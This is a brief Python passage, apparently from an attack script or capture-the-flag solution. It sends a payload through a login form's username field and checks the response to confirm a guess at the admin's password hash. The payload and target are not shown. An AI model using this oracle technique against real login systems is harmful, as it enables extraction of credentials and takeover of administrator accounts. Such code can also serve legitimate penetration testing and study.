data = {
    "username": test_payload,
    "password": "anything",
    "submit": "submit"
}

response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
print(f"[*] Response for exact hash match: {response.text}")

if response.text == '{"response":"password"}':
    print("[+] Hash verification SUCCESSFUL - this IS admin's password hash!")
